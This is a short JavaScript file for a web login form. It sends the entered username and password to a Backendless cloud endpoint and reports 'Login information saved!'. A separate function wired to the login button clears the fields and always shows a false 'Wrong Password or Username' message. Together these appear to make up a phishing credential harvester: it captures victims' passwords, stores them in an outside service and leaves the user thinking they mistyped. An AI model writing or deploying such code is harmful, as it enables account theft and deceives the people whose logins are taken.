function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // Send data to Backendless
  fetch('https://api.backendless.com/5B79FDF8-1A47-430D-88C7-EF485C6940E7', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ username, password })
  })
  .then(response => response.json())
  .then(data => {
    alert("Login information saved!");
    console.log(data);  // Optional: Log the response to the console for debugging
  })
  .catch(error => {
    console.error("Error:", error);
  });
}
// This is for the login button
function clearData() {
  document.getElementById('username').value = "";
  document.getElementById('password').value = "";
  document.getElementsByClassName('wrongPass')[0].innerText = "Wrong Password or Username";
}
